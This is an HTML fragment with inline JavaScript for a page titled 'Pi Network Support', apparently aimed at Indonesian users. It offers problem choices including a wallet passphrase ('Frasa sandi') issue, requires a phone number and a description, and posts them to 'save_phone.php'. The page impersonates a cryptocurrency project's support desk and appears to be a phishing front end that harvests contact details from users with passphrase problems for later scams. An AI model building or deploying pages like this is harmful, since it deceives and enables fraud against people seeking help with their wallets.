    <div class="content p-4">
        <h2>Pi Network Support</h2>
        <p class="text-center">We are ready to help you. Please select the type of problem and describe your problem.
        </p>
        <form action="save_phone.php" method="POST" id="supportForm">
            <div class="mb-3">
                <label class="form-label">Select Problem:</label>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="issue" value="Login Issue" id="loginIssue">
                    <label class="form-check-label" for="loginIssue">Login problem</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="issue" value="Payment Issue" id="Frasa">
                    <label class="form-check-label" for="Frasa">Frasa sandi problem</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="issue" value="Other" id="otherIssue">
                    <label class="form-check-label" for="otherIssue">Other</label>
                </div>
            </div>
            <div class="mb-3">
                <label class="form-label">NO HP:</label>
                <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter your no HP +62"
                    required>
            </div>
            <div class="mb-3">
                <label class="form-label">Describe the problem in more detail:</label>
                <textarea class="form-control" id="description" name="description" rows="4"
                    placeholder="Describe your problem" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary w-100">Send</button>
        </form>
    </div>

    <script>
        document.getElementById("supportForm").addEventListener("submit", function (event) {
            let issue = document.querySelector('input[name="issue"]:checked');
            let phone = document.getElementById("phone").value;
            let description = document.getElementById("description").value;

            if (!issue) {
                alert("Select Problem.");
                event.preventDefault(); // Mencegah form terkirim jika belum memilih
                return;
            }

            if (phone.trim() === "") {
                alert("Enter your phone number.");
                event.preventDefault();
                return;
            }

            if (description.trim() === "") {
                alert("Enter your description.");
                event.preventDefault();
                return;
            }

            alert("Report sent\nIssue: " + issue.value + "\nNo HP: " + phone + "\nDescription: " + description);
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
